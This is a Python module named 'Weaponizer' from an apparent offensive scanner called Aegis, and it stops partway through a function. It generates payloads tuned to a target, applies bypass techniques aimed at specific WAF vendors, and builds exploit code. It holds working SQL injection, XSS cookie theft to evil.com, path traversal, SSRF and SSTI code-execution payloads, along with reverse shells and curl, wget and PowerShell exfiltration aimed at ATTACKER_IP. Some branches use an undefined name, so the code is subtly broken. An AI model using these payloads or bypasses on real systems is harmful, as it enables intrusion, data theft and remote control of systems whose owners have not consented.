"""
scanner.engine.weaponizer
------------------------
智能武器化模块（Weaponizer）

基于现有AttackScriptGenerator的全面升级，提供目标感知的攻击载荷生成能力：

核心能力：
1. 目标感知Payload合成 - 根据技术栈、WAF、输入上下文定制
2. 智能WAF绕过 - 针对特定WAF的绕过策略
3. Exploit代码生成 - 生成可复现的漏洞利用代码
4. 多向量组合攻击 - 支持多阶段、多技术组合
5. 自适应变异 - 基于反馈的Payload优化

设计原则：
    - 上下文驱动：根据目标特征动态调整
    - 策略库驱动：基于已知绕过技术和攻击模式
    - 渐进式增强：从基础验证到深度利用
    - 可解释性：记录决策过程和选择理由

使用示例:
    >>> weaponizer = Weaponizer()
    >>> target_info = TargetInfo.from_recon(recon_result)
    >>> payloads = weaponizer.synthesize("sqli", target_info)
    >>> for p in payloads:
    ...     print(f"Payload: {p.encoded} (confidence: {p.confidence})")
"""

import re
import random
import string
import time
import base64
import hashlib
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Any, Optional, Tuple, Callable, Set
from enum import Enum
from abc import ABC, abstractmethod
import logging

logger = logging.getLogger(__name__)


class PayloadCategory(Enum):
    """Payload类别"""
    SQLI = "sqli"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    XXE = "xxe"
    CMD_INJECTION = "cmd_injection"
    SSTI = "ssti"
    OPEN_REDIRECT = "open_redirect"
    CRLF = "crlf"
    GENERIC = "generic"


class BypassTechnique(Enum):
    """绕过技术类型"""
    NONE = "none"
    URL_ENCODING = "url_encoding"
    DOUBLE_URL_ENCODING = "double_url_encoding"
    UNICODE_ENCODING = "unicode_encoding"
    HTML_ENTITY_ENCODING = "html_entity"
    BASE64_ENCODING = "base64_encoding"
    HEX_ENCODING = "hex_encoding"
    CASE_MANIPULATION = "case_manipulation"
    COMMENT_INSERTION = "comment_insertion"
    NULL_BYTE_INJECTION = "null_byte_injection"
    WHITESPACE_SUBSTITUTION = "whitespace_substitution"
    LINE_BREAK_INJECTION = "line_break_injection"
    TAB_INJECTION = "tab_injection"
    CARRY_OVERFLOW = "carry_overflow"
    SCIENTIFIC_NOTATION = "scientific_notation"
    MULTIPLE_ENCODING = "multiple_encoding"


@dataclass
class TargetContext:
    """
    目标上下文信息（统一版本）
    
    包含从侦察阶段收集的所有信息，用于指导Payload合成和攻击决策。
    
    设计原则：
    - 统一管理：避免在多个模块中重复定义上下文类
    - 渐进增强：支持从ReconResult逐步构建完整上下文
    - 双向兼容：同时满足Weaponizer和ScannerEngine的需求
    """
    # 基础信息
    target_url: str = ""
    
    # 技术栈信息
    primary_framework: str = ""
    primary_language: str = ""
    primary_database: str = ""
    framework_version: Optional[str] = None
    database_version: Optional[str] = None
    
    # WAF信息
    waf_detected: bool = False  # 是否检测到WAF
    waf_type: str = ""  # cloudflare/aws_waf/modsecurity etc.
    waf_vendor: str = ""
    protection_level: int = 0  # 0-4
    
    # 应用架构
    architecture: str = ""  # monolithic/microservices/load_balanced
    is_behind_cdn: bool = False
    is_load_balanced: bool = False
    
    # 认证信息（使用auth_mechanism统一命名）
    auth_type: str = ""  # session/jwt/oauth2 etc. (向后兼容)
    auth_mechanism: str = ""  # 标准命名
    auth_required: bool = False
    auth_endpoints: List[str] = field(default_factory=list)
    
    # 输入上下文（Weaponizer专用）
    input_parameter_name: str = ""
    input_parameter_type: str = ""  # string/integer/search/json/xml
    input_location: str = ""  # query/path/body/header/cookie
    
    # 页面特征（Weaponizer专用）
    page_charset: str = "UTF-8"
    response_content_type: str = ""
    
    # 其他发现（Weaponizer专用）
    csrf_token_present: bool = False
    captcha_present: bool = False
    rate_limiting_detected: bool = False
    
    # 入口点和API端点（侦察增强）
    entry_points: List[Dict[str, Any]] = field(default_factory=list)
    api_endpoints: List[Dict[str, Any]] = field(default_factory=list)
    
    # 技术栈详情（侦察增强）
    technologies: List[Dict[str, Any]] = field(default_factory=list)
    third_party_components: Dict[str, str] = field(default_factory=dict)
    
    # 安全配置（侦察增强）
    security_headers: Dict[str, str] = field(default_factory=dict)
    missing_security_headers: List[str] = field(default_factory=list)
    
    @classmethod
    def from_recon(cls, recon_result) -> 'TargetContext':
        """
        从侦察结果构建目标上下文（增强版）
        
        支持完整的ReconResult数据提取，包括：
        - 基础技术栈信息
        - WAF指纹详情
        - 架构特征
        - 认证机制
        - 入口点和API端点
        - 安全配置
        
        Args:
            recon_result: ReconResult对象
            
        Returns:
            TargetContext: 完整的目标上下文
        """
        if not recon_result:
            return cls()
        
        return cls(
            target_url=getattr(recon_result, 'target_url', ''),
            primary_framework=recon_result.primary_framework or "",
            primary_language=recon_result.primary_language or "",
            primary_database=recon_result.primary_database or "",
            framework_version=None,
            database_version=None,
            waf_detected=recon_result.waf_fingerprint.waf_type.value != 'unknown',
            waf_type=recon_result.waf_fingerprint.waf_type.value,
            waf_vendor=recon_result.waf_fingerprint.vendor_name,
            protection_level=recon_result.waf_fingerprint.protection_level.value,
            architecture=recon_result.architecture.value,
            is_behind_cdn=recon_result.is_behind_cdn,
            is_load_balanced=getattr(recon_result, 'is_load_balanced', False),
            auth_type=recon_result.auth_mechanism.value,  # 向后兼容
            auth_mechanism=recon_result.auth_mechanism.value,
            auth_required=len(recon_result.auth_endpoints) > 0,
            auth_endpoints=recon_result.auth_endpoints.copy(),
            entry_points=[ep.to_dict() for ep in getattr(recon_result, 'entry_points', [])],
            api_endpoints=[ep.to_dict() for ep in getattr(recon_result, 'api_endpoints', [])],
            technologies=[t.to_dict() for t in getattr(recon_result, 'technologies', [])],
            third_party_components=getattr(recon_result, 'third_party_components', {}).copy(),
            security_headers=getattr(recon_result, 'security_headers', {}).copy(),
            missing_security_headers=getattr(recon_result, 'missing_security_headers', []).copy(),
        )
    
    def to_dict(self) -> Dict[str, Any]:
        """
        转换为字典（完整版）
        
        Returns:
            Dict[str, Any]: 包含所有字段的字典
        """
        return {
            # 基础信息
            "target_url": self.target_url,
            
            # 技术栈
            "primary_framework": self.primary_framework,
            "primary_language": self.primary_language,
            "primary_database": self.primary_database,
            
            # WAF
            "waf_detected": self.waf_detected,
            "waf_type": self.waf_type,
            "protection_level": self.protection_level,
            
            # 架构
            "architecture": self.architecture,
            "is_behind_cdn": self.is_behind_cdn,
            "is_load_balanced": self.is_load_balanced,
            
            # 认证
            "auth_type": self.auth_type,
            "auth_mechanism": self.auth_mechanism,
            "input_parameter_type": self.input_parameter_type,
            
            # 入口点（新增）
            "entry_points": self.entry_points,
            "api_endpoints": self.api_endpoints,
            
            # 技术栈详情（新增）
            "technologies": self.technologies,
            
            # 安全配置（新增）
            "security_headers": self.security_headers,
            "missing_security_headers": self.missing_security_headers,
        }


@dataclass
class WeaponizedPayload:
    """
    武器化后的Payload
    
    包含完整的元数据，用于追踪和分析
    """
    original: str           # 原始模板
    encoded: str             # 编码后的最终payload
    category: PayloadCategory
    bypass_technique: BypassTechnique
    confidence: float = 0.5   # 成功概率估计
    risk_level: int = 3      # 1-5 (1=安全, 5=危险)
    
    # 决策依据
    decision_reasons: List[str] = field(default_factory=list)
    target_specific_features: List[str] = field(default_factory=list)
    
    # 元数据
    created_at: float = field(default_factory=time.time)
    source_template: str = ""
    mutations_applied: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "original": self.original,
            "encoded": self.encoded,
            "category": self.category.value,
            "bypass_technique": self.bypass_technique.value,
            "confidence": round(self.confidence, 3),
            "risk_level": self.risk_level,
            "decision_reasons": self.decision_reasons,
            "target_specific_features": self.target_specific_features,
        }


@dataclass
class ExploitCode:
    """
    生成的Exploit代码
    
    用于证明漏洞危害性和辅助修复验证
    """
    language: str          # python/javascript/curl/bash
    code: str              # 完整的exploit代码
    description: str       # 描述
    vulnerability_type: str
    target_url: str
    parameters: Dict[str, str] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "language": self.language,
            "code": self.code,
            "description": self.description,
            "vulnerability_type": self.vulnerability_type,
            "target_url": self.target_url,
            "parameters": self.parameters,
        }
    
    def to_file(self, filepath: str) -> None:
        """保存到文件"""
        ext_map = {
            'python': '.py',
            'javascript': '.js',
            'curl': '.sh',
            'bash': '.sh',
        }
        
        if not filepath.endswith(ext_map.get(self.language, '')):
            filepath += ext_map.get(self.language, '.txt')
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"# {self.description}\n")
            f.write(f"# Generated by Aegis Weaponizer\n")
            f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write(self.code)


class BypassStrategy:
    """
    绕过策略基类
    
    定义如何针对特定WAF或防护机制进行绕过
    """
    
    @abstractmethod
    def get_techniques(self, context: TargetContext) -> List[BypassTechnique]:
        """获取适用的绕过技术列表"""
        pass
    
    @abstractmethod
    def apply(self, payload: str, technique: BypassTechnique, 
              context: TargetContext) -> str:
        """应用指定的绕过技术"""
        pass


class CloudflareBypassStrategy(BypassStrategy):
    """Cloudflare WAF绕过策略"""
    
    def get_techniques(self, context: TargetContext) -> List[BypassTechnique]:
        techniques = [
            BypassTechnique.URL_ENCODING,
            BypassTechnique.UNICODE_ENCODING,
            BypassTechnique.CASE_MANIPULATION,
        ]
        
        if context.protection_level >= 3:
            techniques.extend([
                BypassTechnique.DOUBLE_URL_ENCODING,
                BypassTechnique.MULTIPLE_ENCODING,
            ])
        
        return techniques
    
    def apply(self, payload: str, technique: BypassTechnique, 
              context: TargetContext) -> str:
        if technique == BypassTechnique.URL_ENCODING:
            return urllib.parse.quote(payload, safe='')
        elif technique == BypassTechnique.UNICODE_ENCODING:
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif technique == BypassTechnique.CASE_MANIPULATION:
            return ''.join(c.upper() if random.random() > 0.5 else c.lower() 
                          for c in payload)
        elif technique == BypassTechnique.DOUBLE_URL_ENCODING:
            return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        else:
            return payload


class ModSecurityBypassStrategy(BypassStrategy):
    """ModSecurity WAF绕过策略"""
    
    def get_techniques(self, context: TargetContext) -> List[BypassTechnique]:
        techniques = [
            BypassTechnique.COMMENT_INSERTION,
            BypassTechnique.WHITESPACE_SUBSTITUTION,
            BypassTechnique.NULL_BYTE_INJECTION,
            BypassTechnique.CASE_MANIPULATION,
        ]
        
        if context.protection_level >= 2:
            techniques.extend([
                BypassTechnique.LINE_BREAK_INJECTION,
                BypassTechnique.TAB_INJECTION,
                BypassTechnique.SCIENTIFIC_NOTATION,
            ])
        
        return techniques
    
    def apply(self, payload: str, technique: BypassTechnique, 
              context: TargetContext) -> str:
        if technique == BypassTechnique.COMMENT_INSERTION:
            if context.primary_database == 'mysql':
                return payload.replace(' ', '/**/')
            elif context.primary_database == 'postgresql':
                return payload.replace(' ', '--')
            else:
                return payload.replace(' ', '%20/**/%20')
        
        elif technique == BypassTechnique.WHITESPACE_SUBSTITUTION:
            substitutions = [
                (' ', '/**/'),
                (' ', '%09'),
                (' ', '%0a'),
                (' ', '%0d'),
            ]
            result = payload
            for old, new in substitutions:
                if random.random() > 0.7:
                    result = result.replace(old, new)
            return result
        
        elif technique == BypassTechnique.NULL_BYTE_INJECTION:
            if '<' in payload:
                return payload.replace('<', '%00<')
            return payload + '%00'
        
        elif technique == BypassTechnique.CASE_MANIPULATION:
            return ''.join(c.upper() if i % 2 == 0 else c.lower() 
                          for i, c in enumerate(payload))
        
        elif technique == BypassTechnique.SCIENTIFIC_NOTATION:
            numbers = re.findall(r'\d+', payload)
            for num in numbers:
                scientific = f"{int(num):e}"
                payload = payload.replace(num, scientific)
            return payload
        
        else:
            return payload


class AWSWAFBypassStrategy(BypassStrategy):
    """AWS WAF绕过策略"""
    
    def get_techniques(self, context: TargetContext) -> List[BypassTechnique]:
        return [
            BypassTechnique.URL_ENCODING,
            BypassTechnique.DOUBLE_URL_ENCODING,
            BypassTechnique.HEX_ENCODING,
            BypassTechnique.BASE64_ENCODING,
        ]
    
    def apply(self, payload: str, technique: BypassTechnique, 
              context: TargetContext) -> str:
        if technique == BypassTechnique.URL_ENCODING:
            return urllib.parse.quote(payload, safe='')
        elif technique == BypassTechnique.DOUBLE_URL_ENCODING:
            return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        elif technique == BypassTechnique.HEX_ENCODING:
            return payload.encode().hex()
        elif technique == BypassTechnique.BASE64_ENCODING:
            return base64.b64encode(payload.encode()).decode()
        else:
            return payload


class GenericBypassStrategy(BypassStrategy):
    """通用绕过策略（无WAF或未知WAF）"""
    
    def get_techniques(self, context: TargetContext) -> List[BypassTechnique]:
        return [
            BypassTechnique.URL_ENCODING,
            BypassTechnique.CASE_MANIPULATION,
        ]
    
    def apply(self, payload: str, technique: BypassTechnique, 
              context: TargetContext) -> str:
        if technique == BypassTechnique.URL_ENCODING:
            return urllib.parse.quote(payload, safe='')
        elif technique == BypassTechnique.CASE_MANIPULATION:
            return payload.upper() if random.random() > 0.5 else payload.lower()
        else:
            return payload


class Weaponizer:
    """
    智能武器化器
    
    核心功能：
    1. 根据目标上下文合成针对性Payload
    2. 选择和应用最佳绕过策略
    3. 生成可复现的Exploit代码
    4. 支持多向量组合攻击
    """
    
    # ==================== 数据库特定的Payload模板 ====================
    
    SQLI_TEMPLATES = {
        'mysql': {
            'string_based': [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' AND 1=1--",
                "' AND '1'='1",
                "admin'--",
                "' OR ''='",
            ],
            'numeric_based': [
                " OR 1=1",
                " OR 1=1--",
                "+UNION+SELECT+NULL",
                " AND 1=1",
                "* FROM dual --",
            ],
            'search_based': [
                "%' OR '1'='1'--",
                "%' UNION SELECT NULL--",
                "' AND '%%'='",
            ],
            'time_blind': [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(10000000,SHA1('test'))--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            'error_based': [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
                "' AND EXP(~(SELECT * FROM (SELECT VERSION())a))--",
            ],
            'thinkphp_specific': [
                "id[where]=1%20and%201=updatexml(1,concat(0x7e,user()),1)",
                "id[where]=1%20and%20(extractvalue(1,concat(0x7e,database())))",
                "id[where]=1%20and%20(select%201%20from(mysql.user)%20where%20user='root'%20limit%200,1)=1",
            ],
        },
        'postgresql': {
            'string_based': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users; --",
            ],
            'numeric_based': [
                " OR 1=1",
                " UNION SELECT NULL",
                "; SELECT pg_sleep(5)--",
            ],
            'error_based': [
                "' AND CAST((SELECT VERSION()) AS INT)>0--",
                "' AND 1=CAST((SELECT PASSWORD FROM USERS LIMIT 1) AS INT)--",
            ],
        },
        'mssql': {
            'string_based': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; EXEC xp_cmdshell('dir'); --",
            ],
            'error_based': [
                "' AND 1=CONVERT(INT,(SELECT @@VERSION))--",
                "' AND 1=CONVERT(INT,(SELECT TOP 1 NAME FROM SYSOBJECTS WHERE XTYPE='U'))--",
            ],
        },
        'oracle': {
            'string_based': [
                "' OR '1'='1",
                "' UNION SELECT NULL FROM DUAL--",
                "'||'OR'||'",
            ],
            'error_based': [
                "' AND UTL_INADDR.GET_HOST_NAME((SELECT VERSION FROM V$INSTANCE))='a'--",
                "' AND CTXSYS.DRITHSX.SQL(1,(SELECT VERSION FROM V$INSTANCE))='a'--",
            ],
        },
    }
    
    XSS_TEMPLATES = {
        'reflected': {
            'basic': [
                "<script>alert(1)</script>",
                "<svg onload=alert(1)>",
                "<img src=x onerror=alert(1)>",
                "\"'><script>alert(1)</script>",
                "'-alert(1)-'",
            ],
            'event_handlers': [
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
            ],
            'dom_based': [
                "#<img src=x onerror=alert(1)>",
                "><img src=x onerror=alert(1)>",
                "'-alert(document.domain)-'",
                "\"-eval(name)-\"",
            ],
            'bypass_filters': [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<img src=x onerror=window['al'+'ert'](1)>",
                "<svg/onload=alert(1)>",
                "<script\x3ealert(1)\x3c/script>",
                "<a/href=javascript:alert(1)>click</a>",
            ],
        },
        'stored': {
            'basic': [
                "<script>document.location='http://evil.com/?c='+document.cookie</script>",
                "<img src=x onerror='fetch(\"http://evil.com/?c=\"+document.cookie)'",
                "<svg onload='new Image().src=\"http://evil.com/?c=\"+document.cookie'>",
            ],
            'data_uri': [
                "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
                "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
            ],
        },
    }
    
    PATH_TRAVERSAL_TEMPLATES = {
        'unix': {
            'basic': [
                "../etc/passwd",
                "..%2f..%2fetc%2fpasswd",
                "....//....//etc/passwd",
                "/etc/passwd",
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
            'encoded': [
                "..%252f..%252fetc%252fpasswd",
                "..%c0%ae..%c0%ae/etc/passwd",  # UTF-8 overlong
                "..%c0%af..%c0%af/etc/passwd",
            ],
            'specific_files': [
                "../etc/shadow",
                "../var/log/apache2/access.log",
                "../proc/self/environ",
                "../etc/hosts",
            ],
        },
        'windows': {
            'basic': [
                "..\\..\\windows\\win.ini",
                "..%5c..%5cwindows%5cwin.ini",
                "..../windows/win.ini",
                "....//....//windows/win.ini",
            ],
            'specific_files': [
                "..\\..\\boot.ini",
                "..\\..\\system.ini",
                "..\\..\\windows\\repair\\sam",
            ],
        },
    }
    
    CMD_INJECTION_TEMPLATES = {
        'unix': {
            'basic': [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "&& id",
                "|| id",
                "\n id",
                "\r\n id",
            ],
            'reverse_shell': [
                "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                "| nc ATTACKER_IP 4444 -e /bin/bash",
                "&& python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup(s.fileno()) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
            ],
            'data_exfiltration': [
                "; curl http://ATTACKER_IP/?data=$(cat /etc/passwd | base64)",
                "| wget http://ATTACKER_IP/?data=$(whoami)",
            ],
        },
        'windows': {
            'basic': [
                "& dir",
                "| dir",
                "&& whoami",
                "|| whoami",
                "\r\n whoami",
            ],
            'powershell': [
                "& powershell -Command \"Invoke-WebRequest -Uri 'http://ATTACKER_IP/?data=$env:USERNAME'\"",
                "| powershell -c \"Get-Content C:\\Windows\\win.ini | Out-File -Encoding ascii C:\\temp\\out.txt; Invoke-WebRequest -Uri 'http://ATTACKER_IP/?file=C:\\temp\\out.txt'\"",
            ],
        },
    }
    
    SSRF_TEMPLATES = {
        'internal_recon': [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://0x7f000001",
            "http://2130706433",
        ],
        'cloud_metadata': [
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://metadata.google.internal/computeMetadata/v1/",
        ],
        'protocol_smuggling': [
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:6379/INFO",
            "file:///etc/passwd",
            "http://0x7f000001:80",
        ],
    }
    
    SSTI_TEMPLATES = {
        'jinja2': [
            "{{7*7}}",
            "{{config}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[-1]('/etc/passwd').read()}}",
            "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c._module._builtins['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}",
        ],
        'twig': [
            "{{_self.env.display(\"id\")}}",
            "{{['id']|filter('system')}}",
            "{{app.request.server.all.get('/etc/passwd').read()}}",
        ],
        'freemarker': [
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "${Product.getClass().protectionDomain.classLoader.loadClass(\"Runtime\").getMethods()[6].invoke(null,\"id\").toString()}",
        ],
    }
    
    def __init__(self, strategy: str = "intelligent"):
        """
        初始化武器化器
        
        Args:
            strategy: 武器化策略 (intelligent/aggressive/stealthy)
        """
        self.strategy = strategy
        
        # 初始化绕过策略映射
        self._bypass_strategies: Dict[str, BypassStrategy] = {
            'cloudflare': CloudflareBypassStrategy(),
            'modsecurity': ModSecurityBypassStrategy(),
            'aws_waf': AWSWAFBypassStrategy(),
            'unknown': GenericBypassStrategy(),
            'none': GenericBypassStrategy(),
        }
        
        # 统计信息
        self._synthesis_count = 0
        self._exploit_generation_count = 0
    
    def synthesize(self, category: str, 
                   context: TargetContext,
                   max_payloads: int = 10) -> List[WeaponizedPayload]:
        """
        合成针对性的Payload列表
        
        Args:
            category: 漏洞类别 (sqli/xss/path_traversal/cmd_injection/ssrf/ssti等)
            context: 目标上下文信息
            max_payloads: 最大生成数量
            
        Returns:
            武器化后的Payload列表
        """
        try:
            payload_category = PayloadCategory(category.lower())
        except ValueError:
            payload_category = PayloadCategory.GENERIC
        
        logger.info(f"开始合成 {category.upper()} Payload (strategy={self.strategy}, "
                   f"framework={context.primary_framework}, "
                   f"WAF={context.waf_type})")
        
        # 1. 选择基础模板
        templates = self._select_templates(payload_category, context)
        
        # 2. 获取绕过策略
        bypass_strategy = self._get_bypass_strategy(context)
        techniques = bypass_strategy.get_techniques(context)
        
        # 3. 合成最终Payload
        synthesized = []
        
        for template in templates[:max_payloads // len(techniques) or 1]:
            for technique in techniques:
                try:
                    # 应用绕过技术
                    encoded = bypass_strategy.apply(template, technique, context)
                    
                    # 根据输入类型进行额外处理
                    if context.input_parameter_type == 'json':
                        encoded = self._json_encode(encoded)
                    elif context.input_parameter_type == 'xml':
                        encoded = self._xml_escape(encoded)
                    
                    # 计算置信度
                    confidence = self._calculate_confidence(
                        template, technique, context
                    )
                    
                    # 计算风险等级
                    risk_level = self._calculate_risk_level(payload_category, encoded)
                    
                    # 收集决策依据
                    reasons = self._collect_decision_reasons(
                        template, technique, context
                    )
                    
                    # 收集目标特定特征
                    features = self._extract_target_specific_features(encoded, context)
                    
                    payload_obj = WeaponizedPayload(
                        original=template,
                        encoded=encoded,
                        category=payload_category,
                        bypass_technique=technique,
                        confidence=confidence,
                        risk_level=risk_level,
                        decision_reasons=reasons,
                        target_specific_features=features,
                        source_template=f"{category}_{context.primary_framework or 'generic'}",
                        mutations_applied=[technique.value],
                    )
                    
                    synthesized.append(payload_obj)
                    self._synthesis_count += 1
                    
                except Exception as e:
                    logger.warning(f"Payload合成失败 ({technique.value}): {e}")
                    continue
                
                if len(synthesized) >= max_payloads:
                    break
            
            if len(synthesized) >= max_payloads:
                break
        
        # 按置信度排序
        synthesized.sort(key=lambda p: p.confidence, reverse=True)
        
        logger.info(f"合成完成: {len(synthesized)} 个 {category.upper()} Payload")
        
        return synthesized[:max_payloads]
    
    def generate_exploit(self, vulnerability_type: str,
                         target_url: str,
                         vulnerable_param: str,
                         successful_payload: WeaponizedPayload,
                         language: str = "python") -> ExploitCode:
        """
        生成可复现的Exploit代码
        
        Args:
            vulnerability_type: 漏洞类型
            target_url: 目标URL
            vulnerable_param: 漏洞参数名
            successful_payload: 成功利用的Payload
            language: 输出语言 (python/javascript/curl/bash)
            
        Returns:
            Exploit代码对象
        """
        self._exploit_generation_count += 1
        
        if language == "python":
            code = self._generate_python_exploit(
                vulnerability_type, target_url, vulnerable_param, successful_payload
            )
        elif language == "javascript":
            code = self._generate_javascript_exploit(
                vulnerability_type, target_url, vulnerable_param, successful_payload
            )
        elif language in ["curl", "bash"]:
            code = self._generate_curl_exploit(
                vulnerability_type, target_url, vulnerable_param, successful_payload
            )
        else:
            code = f"# Unsupported language: {language}"
        
        exploit = ExploitCode(
            language=language,
            code=code,
            description=f"{vulnerability_type.upper()} Exploit for {target_url}",
            vulnerability_type=vulnerability_type,
            target_url=target_url,
            parameters={
                "vulnerable_param": vulnerable_param,
                "payload": successful_payload.encoded,
                "original_payload": successful_payload.original,
                "category": successful_payload.category.value,
                "bypass_technique": successful_payload.bypass_technique.value,
            },
        )
        
        logger.info(f"已生成 {language} Exploit: {vulnerability_type}")
        
        return exploit
    
    def _select_templates(self, category: PayloadCategory, 
                          context: TargetContext) -> List[str]:
        """根据目标和类别选择合适的Payload模板"""
        templates = []
        
        db_type = context.primary_database.lower() if context.primary_database else ''
        framework = context.primary_framework.lower() if context.primary_framework else ''
        input_type = context.input_parameter_type.lower()
        
        if category == PayloadCategory.SQLI:
            # 根据数据库类型选择
            if db_type and db_type in self.SQLI_TEMPLATES:
                db_templates = self.SQLI_TEMPLATES[db_type]
                
                # 根据输入类型选择子类别
                if 'string' in input_type or 'search' in input_type:
                    key = 'search_based' if 'search' in input_type else 'string_based'
                    templates.extend(db_templates.get(key, []))
                
                if 'integer' in input_type or 'numeric' in input_type:
                    templates.extend(db_templates.get('numeric_based', []))
                
                # 如果是ThinkPHP，添加特有模板
                if 'thinkphp' in framework:
                    templates.extend(db_templates.get('thinkphp_specific', []))
                
                # 默认使用string_based
                if not templates:
                    templates = db_templates.get('string_based', [])
            else:
                # 使用通用MySQL模板
                templates = self.SQLI_TEMPLATES.get('mysql', {}).get('string_based', [])
        
        elif category == PayloadType.XSS:
            xss_templates = self.XSS_TEMPLATES.get('reflected', {})
            templates = xss_templates.get('basic', []) + xss_templates.get('event_handlers', [])
        
        elif category == PayloadType.PATH_TRAVERSAL:
            os_type = 'unix'  # 默认Unix
            if 'windows' in framework or 'asp' in framework or 'iis' in context.waf_type:
                os_type = 'windows'
            
            path_templates = self.PATH_TRAVERSAL_TEMPLATES.get(os_type, {})
            templates = path_templates.get('basic', [])
        
        elif category == PayloadType.CMD_INJECTION:
            os_type = 'unix'  # 默认Unix
            if 'windows' in framework or 'asp' in framework:
                os_type = 'windows'
            
            cmd_templates = self.CMD_INJECTION_TEMPLATES.get(os_type, {})
            templates = cmd_templates.get('basic', [])
        
        elif category == PayloadType.SSRF:
            templates = self.SSRF_TEMPLATES.get('internal_recon', [])
        
        elif category == PayloadType.SSTI:
            ssti_templates = self.SSTI_TEMPLATES
            if 'jinja2' in framework or 'flask' in framework or 'django' in framework:
                templates = ssti_templates.get('jinja2', [])
            elif 'twig' in framework:
                templates = ssti_templates.get('twig', [])
            else:
                templates = ssti_templates.get('jinja2', [])
        
        else:
            # 通用模板
            templates = ["test{{RandomInt}}", "aegis_probe"]
        
        return templates
    
    def _get_bypass_strategy(self, context: TargetContext) -> BypassStrategy:
        """获取适合当前目标的绕过策略"""
        waf_type = context.waf_type.lower().replace('-', '_').replace(' ', '_')
        
        strategy = self._bypass_strategies.get(waf_type)
        if not strategy:
            strategy = self._bypass_strategies.get('unknown')
        
        return strategy
    
    def _calculate_confidence(self, template: str, 
                             technique: BypassTechnique,
                             context: TargetContext) -> float:
        """计算Payload的成功置信度"""
        confidence = 0.5  # 基础置信度
        
        # 技术栈匹配加分
        if context.primary_database and context.primary_database.lower() in template.lower():
            confidence += 0.15
        if context.primary_framework and context.primary_framework.lower() in template.lower():
            confidence += 0.10
        
        # 绕过技术适配度
        if context.protection_level >= 3:
            if technique in [BypassTechnique.DOUBLE_URL_ENCODING, 
                           BypassTechnique.MULTIPLE_ENCODING,
                           BypassTechnique.UNICODE_ENCODING]:
                confidence += 0.15
        elif context.protection_level >= 1:
            if technique in [BypassTechnique.URL_ENCODING,
                           BypassTechnique.CASE_MANIPULATION]:
                confidence += 0.10
        
        # 输入类型匹配
        if context.input_parameter_type == 'integer' and not any(
            c.isalpha() for c in template.split()[0] if template
        ):
            confidence += 0.05
        elif context.input_parameter_type == 'string' and any(
            "'" in template or '"' in template for template in [template]
        ):
            confidence += 0.05
        
        # WAF特定优化
        if context.waf_type == 'cloudflare' and \
           technique in [BypassTechnique.URL_ENCODING, BypassTechnique.UNICODE_ENCODING]:
            confidence += 0.10
        elif context.waf_type == 'modsecurity' and \
             technique in [BypassTechnique.COMMENT_INSERTION,
                        BypassTechnique.NULL_BYTE_INJECTION]:
            confidence += 0.10
        
        return min(confidence, 1.0)
    
    def _calculate_risk_level(self, category: PayloadCategory, 
                              payload: str) -> int:
        """计算Payload的风险等级 (1-5)"""
        base_risk = {
            PayloadCategory.GENERIC: 1,
            PayloadCategory.OPEN_REDIRECT: 2,
            PayloadCategory.PATH_TRAVERSAL: 3,
            PayloadCategory.LFI: 3,
            PayloadCategory.SSRF: 3,
            PayloadCategory.XSS: 3,
            PayloadCategory.SQLI: 4,
            PayloadType.XXE: 4,
            PayloadCategory.CMD_INJECTION: 5,
            PayloadCategory.SSTI: 4,
        }.get(category, 2)
        
        # 危险关键词检测
        dangerous_keywords = [
            'rm -rf', 'drop table', 'delete from', 'exec(', 'system(',
            'eval(', 'passthru(', 'shell_exec(', 'wget ', 'curl ',
            '/etc/passwd', '/etc/shadow', 'password', 'secret',
        ]
        
        for keyword in dangerous_keywords:
            if keyword.lower() in payload.lower():
                base_risk = min(base_risk + 1, 5)
                break
        
        return base_risk
    
    def _collect_decision_reasons(self, template: str, 
                                 technique: BypassTechnique,
                                 context: TargetContext) -> List[str]:
        """收集决策依据"""
        reasons = []
        
